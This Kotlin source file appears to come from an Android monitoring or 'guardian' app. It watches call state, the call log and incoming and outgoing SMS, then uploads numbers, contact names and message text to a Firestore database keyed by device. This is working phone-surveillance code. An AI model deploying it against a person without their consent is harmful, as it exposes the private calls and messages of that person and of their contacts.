@file:Suppress("DEPRECATION")

package com.nexus.androkiller.tracker

import android.content.ContentResolver
import android.content.ContentValues
import android.content.Context
import android.database.ContentObserver
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.CallLog
import android.provider.Telephony
import android.telephony.PhoneStateListener
import android.telephony.TelephonyCallback
import android.telephony.TelephonyManager
import android.util.Log
import androidx.annotation.RequiresApi
import androidx.core.content.ContextCompat
import com.google.firebase.firestore.FieldValue
import com.google.firebase.firestore.FirebaseFirestore
import com.nexus.androkiller.model.NotificationRecord
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import java.util.UUID

class NotificationManager(private val context: Context) {

    private val firestore: FirebaseFirestore?
        get() = try {
            FirebaseFirestore.getInstance()
        } catch (_: Exception) {
            null
        }

    private val prefs = context.getSharedPreferences("tracker_prefs", Context.MODE_PRIVATE)
    private val scope = CoroutineScope(Dispatchers.IO + Job())
    @Suppress("DEPRECATION")
    private var callListener: PhoneStateListener? = null
    private var telephonyCallback: Any? = null
    private var callLastState = TelephonyManager.CALL_STATE_IDLE
    private var callIncomingNumber: String? = null
    private var callLogObserver: ContentObserver? = null
    private var smsObserver: ContentObserver? = null
    private var isListening = false

    // In-memory dedup set — loaded from SharedPrefs on start so service restart
    // doesn't re-push already-seen notifications.
    private val recentNotifKeys = java.util.Collections.synchronizedSet(LinkedHashSet<String>())

    private val TAG = "NotificationManager"

    fun startListening(deviceId: String) {
        if (isListening) return
        isListening = true

        // Clear in-memory dedup cache on start
        recentNotifKeys.clear()

        // Initialize cursors from SharedPreferences or current latest ID to prevent dumping historical logs
        var savedCallId = prefs.getLong("last_call_log_id", -1L)
        if (savedCallId <= 0L) {
            savedCallId = getLatestCallLogId()
            prefs.edit().putLong("last_call_log_id", savedCallId).apply()
        }
        lastCallLogId = savedCallId

        var savedSmsId = prefs.getLong("last_sms_id", -1L)
        if (savedSmsId <= 0L) {
            savedSmsId = getLatestSmsId()
            prefs.edit().putLong("last_sms_id", savedSmsId).apply()
        }
        lastSmsId = savedSmsId

        startCallListener(deviceId)
        startCallLogObserver(deviceId)
        startSmsObserver(deviceId)
        Log.i(TAG, "Started real-time notification listeners for device: $deviceId (callId: $lastCallLogId, smsId: $lastSmsId)")
    }

    fun stopListening() {
        isListening = false
        val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            if (tm != null) {
                try {
                    unregisterTelephonyCallbackModern(tm)
                } catch (e: Exception) {
                    Log.w(TAG, "Error stopping telephony callback: ${e.message}")
                }
            }
            telephonyCallback = null
        } else {
            callListener?.let {
                try {
                    @Suppress("DEPRECATION")
                    tm?.listen(it, PhoneStateListener.LISTEN_NONE)
                } catch (e: Exception) {
                    Log.w(TAG, "Error stopping call listener: ${e.message}")
                }
            }
            callListener = null
        }
        callLastState = TelephonyManager.CALL_STATE_IDLE
        callIncomingNumber = null

        callLogObserver?.let {
            try {
                context.contentResolver.unregisterContentObserver(it)
            } catch (e: Exception) {
                Log.w(TAG, "Error stopping call log observer: ${e.message}")
            }
        }
        callLogObserver = null

        smsObserver?.let {
            try {
                context.contentResolver.unregisterContentObserver(it)
            } catch (e: Exception) {
                Log.w(TAG, "Error stopping SMS observer: ${e.message}")
            }
        }
        smsObserver = null

        Log.i(TAG, "Stopped real-time notification listeners")
    }

    private fun getLatestCallLogId(): Long {
        try {
            val cursor = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(CallLog.Calls._ID),
                null,
                null,
                "${CallLog.Calls.DATE} DESC LIMIT 1"
            )
            cursor?.use {
                if (it.moveToFirst()) {
                    val idCol = it.getColumnIndex(CallLog.Calls._ID)
                    if (idCol != -1) return it.getLong(idCol)
                }
            }
        } catch (_: Exception) {}
        return 0L
    }

    private fun getLatestSmsId(): Long {
        try {
            val cursor = context.contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                arrayOf(Telephony.Sms._ID),
                null,
                null,
                "${Telephony.Sms.DATE} DESC LIMIT 1"
            )
            cursor?.use {
                if (it.moveToFirst()) {
                    val idCol = it.getColumnIndex(Telephony.Sms._ID)
                    if (idCol != -1) return it.getLong(idCol)
                }
            }
        } catch (_: Exception) {}
        return 0L
    }

    private fun startCallListener(deviceId: String) {
        try {
            val hasPhoneState = ContextCompat.checkSelfPermission(
                context, android.Manifest.permission.READ_PHONE_STATE
            ) == android.content.pm.PackageManager.PERMISSION_GRANTED

            if (!hasPhoneState) {
                Log.w(TAG, "READ_PHONE_STATE not granted — skipping call state listener")
                return
            }

            val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                registerTelephonyCallbackModern(tm, deviceId)
            } else {
                @Suppress("DEPRECATION")
                val listener = object : PhoneStateListener() {
                    @Deprecated("Deprecated in Java")
                    override fun onCallStateChanged(state: Int, phoneNumber: String?) {
                        super.onCallStateChanged(state, phoneNumber)
                        handleCallStateChanged(deviceId, state, phoneNumber)
                    }
                }
                callListener = listener
                @Suppress("DEPRECATION")
                tm.listen(listener, PhoneStateListener.LISTEN_CALL_STATE)
                Log.d(TAG, "Registered PhoneStateListener for legacy Android (< 12)")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to register call listener: ${e.message}", e)
        }
    }

    @RequiresApi(Build.VERSION_CODES.S)
    private fun registerTelephonyCallbackModern(tm: TelephonyManager, deviceId: String) {
        val callback = object : TelephonyCallback(), TelephonyCallback.CallStateListener {
            override fun onCallStateChanged(state: Int) {
                handleCallStateChanged(deviceId, state, null)
            }
        }
        telephonyCallback = callback
        tm.registerTelephonyCallback(ContextCompat.getMainExecutor(context), callback)
        Log.d(TAG, "Registered TelephonyCallback for Android 12+ (API ${Build.VERSION.SDK_INT})")
    }

    @RequiresApi(Build.VERSION_CODES.S)
    private fun unregisterTelephonyCallbackModern(tm: TelephonyManager) {
        (telephonyCallback as? TelephonyCallback)?.let {
            tm.unregisterTelephonyCallback(it)
        }
        telephonyCallback = null
    }

    private fun handleCallStateChanged(deviceId: String, state: Int, phoneNumber: String?) {
        when (state) {
            TelephonyManager.CALL_STATE_RINGING -> {
                callLastState = state
                if (!phoneNumber.isNullOrEmpty()) {
                    callIncomingNumber = phoneNumber
                }
                val num = callIncomingNumber ?: phoneNumber
                val name = if (!num.isNullOrEmpty()) getContactName(num) else ""
                val bodyText = if (name.isNotEmpty() && name != num) {
                    "Call from $name ($num)"
                } else if (!num.isNullOrEmpty()) {
                    "Call from $num"
                } else {
                    "Incoming call detected"
                }
                scope.launch {
                    pushNotification(
                        deviceId = deviceId,
                        type = "CALL_INCOMING",
                        title = "Incoming Call",
                        body = bodyText,
                        contactName = name,
                        contactNumber = num ?: "",
                        priority = "MAX"
                    )
                }
            }
            TelephonyManager.CALL_STATE_OFFHOOK -> {
                if (callLastState == TelephonyManager.CALL_STATE_RINGING) {
                    // Call was answered
                    val num = callIncomingNumber ?: phoneNumber
                    val name = if (!num.isNullOrEmpty()) getContactName(num) else ""
                    val bodyText = if (name.isNotEmpty() && name != num) {
                        "Answered call from $name ($num)"
                    } else if (!num.isNullOrEmpty()) {
                        "Answered call from $num"
                    } else {
                        "Call answered"
                    }
                    scope.launch {
                        pushNotification(
                            deviceId = deviceId,
                            type = "CALL_OUTGOING",
                            title = "Call Answered",
                            body = bodyText,
                            contactName = name,
                            contactNumber = num ?: "",
                            priority = "HIGH"
                        )
                    }
                } else {
                    // Outgoing call initiated
                    val num = phoneNumber
                    val name = if (!num.isNullOrEmpty()) getContactName(num) else ""
                    val bodyText = if (name.isNotEmpty() && name != num) {
                        "Calling $name ($num)"
                    } else if (!num.isNullOrEmpty()) {
                        "Calling $num"
                    } else {
                        "Outgoing call initiated"
                    }
                    scope.launch {
                        pushNotification(
                            deviceId = deviceId,
                            type = "CALL_OUTGOING",
                            title = "Outgoing Call",
                            body = bodyText,
                            contactName = name,
                            contactNumber = num ?: "",
                            priority = "HIGH"
                        )
                    }
                }
                callLastState = state
            }
            TelephonyManager.CALL_STATE_IDLE -> {
                if (callLastState == TelephonyManager.CALL_STATE_RINGING) {
                    // Missed call
                    val num = callIncomingNumber ?: phoneNumber
                    val name = if (!num.isNullOrEmpty()) getContactName(num) else ""
                    val bodyText = if (name.isNotEmpty() && name != num) {
                        "Missed call from $name ($num)"
                    } else if (!num.isNullOrEmpty()) {
                        "Missed call from $num"
                    } else {
                        "Missed call detected"
                    }
                    scope.launch {
                        pushNotification(
                            deviceId = deviceId,
                            type = "CALL_MISSED",
                            title = "Missed Call",
                            body = bodyText,
                            contactName = name,
                            contactNumber = num ?: "",
                            priority = "HIGH"
                        )
                    }
                }
                callLastState = state
                callIncomingNumber = null
            }
        }
    }

    private fun startCallLogObserver(deviceId: String) {
        callLogObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
            override fun onChange(selfChange: Boolean) {
                super.onChange(selfChange)
                scope.launch {
                    checkNewCallLog(deviceId)
                }
            }
        }

        try {
            context.contentResolver.registerContentObserver(
                CallLog.Calls.CONTENT_URI,
                true,
                callLogObserver!!
            )
        } catch (e: Exception) {
            Log.e(TAG, "Failed to register call log observer: ${e.message}", e)
        }
    }

    private var lastCallLogId = 0L

    private suspend fun checkNewCallLog(deviceId: String) {
        try {
            if (lastCallLogId <= 0L) {
                lastCallLogId = getLatestCallLogId()
                prefs.edit().putLong("last_call_log_id", lastCallLogId).apply()
                return
            }

            val projection = arrayOf(
                CallLog.Calls._ID,
                CallLog.Calls.NUMBER,
                CallLog.Calls.CACHED_NAME,
                CallLog.Calls.TYPE,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION
            )

            val cursor = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                projection,
                "${CallLog.Calls._ID} > ?",
                arrayOf(lastCallLogId.toString()),
                "${CallLog.Calls._ID} ASC"
            )

            cursor?.use {
                if (it.moveToFirst()) {
                    val idCol = it.getColumnIndex(CallLog.Calls._ID)
                    val numCol = it.getColumnIndex(CallLog.Calls.NUMBER)
                    val nameCol = it.getColumnIndex(CallLog.Calls.CACHED_NAME)
                    val typeCol = it.getColumnIndex(CallLog.Calls.TYPE)
                    val dateCol = it.getColumnIndex(CallLog.Calls.DATE)
                    val durCol = it.getColumnIndex(CallLog.Calls.DURATION)

                    var maxIdFound = lastCallLogId
                    do {
                        val id = if (idCol != -1) it.getLong(idCol) else 0L
                        val number = if (numCol != -1) it.getString(numCol) ?: "Unknown" else "Unknown"
                        val name = if (nameCol != -1) it.getString(nameCol) ?: "" else ""
                        val rawType = if (typeCol != -1) it.getInt(typeCol) else -1
                        val date = if (dateCol != -1) it.getLong(dateCol) else 0L
                        val duration = if (durCol != -1) it.getLong(durCol) else 0L

                        if (id > maxIdFound) {
                            maxIdFound = id
                        }

                        val typeStr = when (rawType) {
                            CallLog.Calls.INCOMING_TYPE -> "CALL_INCOMING"
                            CallLog.Calls.OUTGOING_TYPE -> "CALL_OUTGOING"
                            CallLog.Calls.MISSED_TYPE -> "CALL_MISSED"
                            CallLog.Calls.REJECTED_TYPE -> "CALL_MISSED"
                            else -> "CALL_INCOMING"
                        }

                        val contactName = name.ifBlank { number }
                        val title = when (typeStr) {
                            "CALL_INCOMING" -> "Incoming Call"
                            "CALL_OUTGOING" -> "Outgoing Call"
                            "CALL_MISSED" -> "Missed Call"
                            else -> "Call"
                        }
                        val priority = when (typeStr) {
                            "CALL_MISSED" -> "HIGH"
                            "CALL_INCOMING" -> "MAX"
                            else -> "HIGH"
                        }
                        val durFormatted = if (duration < 60) "${duration}s" else "${duration / 60}m ${duration % 60}s"
                        val body = when (typeStr) {
                            "CALL_INCOMING" -> "Call from $contactName ($number)"
                            "CALL_OUTGOING" -> "Called $contactName ($number) - $durFormatted"
                            "CALL_MISSED" -> "Missed call from $contactName ($number)"
                            else -> "Call from $contactName ($number)"
                        }

                        pushNotification(
                            deviceId = deviceId,
                            type = typeStr,
                            title = title,
                            body = body,
                            contactName = contactName,
                            contactNumber = number,
                            priority = priority
                        )
                    } while (it.moveToNext())

                    if (maxIdFound > lastCallLogId) {
                        lastCallLogId = maxIdFound
                        prefs.edit().putLong("last_call_log_id", lastCallLogId).apply()
                    }
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Error checking new call log: ${e.message}")
        }
    }

    private fun startSmsObserver(deviceId: String) {
        smsObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
            override fun onChange(selfChange: Boolean) {
                super.onChange(selfChange)
                scope.launch {
                    checkNewSms(deviceId)
                }
            }
        }

        try {
            context.contentResolver.registerContentObserver(
                Telephony.Sms.CONTENT_URI,
                true,
                smsObserver!!
            )
        } catch (e: Exception) {
            Log.e(TAG, "Failed to register SMS observer: ${e.message}", e)
        }
    }

    private var lastSmsId = 0L

    private suspend fun checkNewSms(deviceId: String) {
        try {
            if (lastSmsId <= 0L) {
                lastSmsId = getLatestSmsId()
                prefs.edit().putLong("last_sms_id", lastSmsId).apply()
                return
            }

            val projection = arrayOf(
                Telephony.Sms._ID,
                Telephony.Sms.ADDRESS,
                Telephony.Sms.BODY,
                Telephony.Sms.TYPE,
                Telephony.Sms.DATE
            )

            val cursor = context.contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                projection,
                "${Telephony.Sms._ID} > ?",
                arrayOf(lastSmsId.toString()),
                "${Telephony.Sms._ID} ASC"
            )

            cursor?.use {
                if (it.moveToFirst()) {
                    val idCol = it.getColumnIndex(Telephony.Sms._ID)
                    val addrCol = it.getColumnIndex(Telephony.Sms.ADDRESS)
                    val bodyCol = it.getColumnIndex(Telephony.Sms.BODY)
                    val typeCol = it.getColumnIndex(Telephony.Sms.TYPE)
                    val dateCol = it.getColumnIndex(Telephony.Sms.DATE)

                    var maxIdFound = lastSmsId
                    do {
                        val id = if (idCol != -1) it.getLong(idCol) else 0L
                        val address = if (addrCol != -1) it.getString(addrCol) ?: "Unknown" else "Unknown"
                        val body = if (bodyCol != -1) it.getString(bodyCol) ?: "" else ""
                        val rawType = if (typeCol != -1) it.getInt(typeCol) else -1
                        val date = if (dateCol != -1) it.getLong(dateCol) else 0L

                        if (id > maxIdFound) {
                            maxIdFound = id
                        }

                        val typeStr = when (rawType) {
                            Telephony.Sms.MESSAGE_TYPE_INBOX -> "SMS_INCOMING"
                            Telephony.Sms.MESSAGE_TYPE_SENT -> "SMS_OUTGOING"
                            else -> "SMS_INCOMING"
                        }

                        val name = getContactName(address)
                        val title = if (typeStr == "SMS_INCOMING") "New SMS" else "SMS Sent"
                        val priority = if (typeStr == "SMS_INCOMING") "HIGH" else "DEFAULT"

                        pushNotification(
                            deviceId = deviceId,
                            type = typeStr,
                            title = title,
                            body = body.take(160),
                            contactName = name,
                            contactNumber = address,
                            priority = priority
                        )
                    } while (it.moveToNext())

                    if (maxIdFound > lastSmsId) {
                        lastSmsId = maxIdFound
                        prefs.edit().putLong("last_sms_id", lastSmsId).apply()
                    }
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Error checking new SMS: ${e.message}")
        }
    }

    fun pushNotification(
        deviceId: String,
        type: String,
        title: String,
        body: String,
        contactName: String = "",
        contactNumber: String = "",
        priority: String = "DEFAULT"
    ) {
        // Debounce: only suppress exact duplicates within a short 15-second window
        val timeBucket = System.currentTimeMillis() / 15000L
        val notifKey = "$type|$contactNumber|$timeBucket|${body.take(40)}"

        if (recentNotifKeys.contains(notifKey)) {
            Log.d(TAG, "Debouncing rapid duplicate notification: $notifKey")
            return
        }

        // Keep in-memory dedup set small
        if (recentNotifKeys.size >= 60) {
            val iterator = recentNotifKeys.iterator()
            repeat(15) { if (iterator.hasNext()) { iterator.next(); iterator.remove() } }
        }
        recentNotifKeys.add(notifKey)

        scope.launch {
            val db = firestore ?: return@launch
            try {
                // Unique document ID with current timestamp prefix so docs sort chronologically in Firestore
                val docId = "${System.currentTimeMillis()}_${UUID.randomUUID().toString().take(8)}"
                val nowMs = System.currentTimeMillis()

                val payload = hashMapOf(
                    "id" to docId,
                    "deviceId" to deviceId,
                    "type" to type,
                    "title" to title,
                    "body" to body,
                    "contactName" to contactName,
                    "contactNumber" to contactNumber,
                    "isRead" to false,
                    "priority" to priority,
                    "timestamp" to FieldValue.serverTimestamp(),
                    "createdAt" to nowMs
                )

                db.collection("devices")
                    .document(deviceId)
                    .collection("notifications")
                    .document(docId)
                    .set(payload)

                Log.i(TAG, "Pushed notification to Firestore: $type - $title [docId=$docId]")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to push notification: ${e.message}", e)
            }
        }
    }

    fun pushGuardianMessageNotification(deviceId: String, message: String) {
        pushNotification(
            deviceId = deviceId,
            type = "GUARDIAN_MESSAGE",
            title = "Guardian Alert",
            body = message,
            priority = "MAX"
        )
    }

    fun pushSystemAlert(deviceId: String, title: String, body: String) {
        pushNotification(
            deviceId = deviceId,
            type = "SYSTEM_ALERT",
            title = title,
            body = body,
            priority = "HIGH"
        )
    }

    private fun getContactName(phoneNumber: String): String {
        if (phoneNumber.isBlank()) return "Unknown"
        try {
            val uri = Uri.withAppendedPath(CallLog.Calls.CONTENT_FILTER_URI, Uri.encode(phoneNumber))
            val cursor = context.contentResolver.query(uri, arrayOf(CallLog.Calls.CACHED_NAME), null, null, null)
            cursor?.use {
                if (it.moveToFirst()) {
                    val nameCol = it.getColumnIndex(CallLog.Calls.CACHED_NAME)
                    return if (nameCol != -1) it.getString(nameCol) ?: phoneNumber else phoneNumber
                }
            }
        } catch (_: Exception) {}
        return phoneNumber
    }

    companion object {
        fun initializeSmsCursor(context: Context): Long {
            var lastId = 0L
            try {
                val cursor = context.contentResolver.query(
                    Telephony.Sms.CONTENT_URI,
                    arrayOf(Telephony.Sms._ID),
                    null,
                    null,
                    "${Telephony.Sms.DATE} DESC LIMIT 1"
                )
                cursor?.use {
                    if (it.moveToFirst()) {
                        val idCol = it.getColumnIndex(Telephony.Sms._ID)
                        lastId = if (idCol != -1) it.getLong(idCol) else 0L
                    }
                }
            } catch (_: Exception) {}
            return lastId
        }
    }
}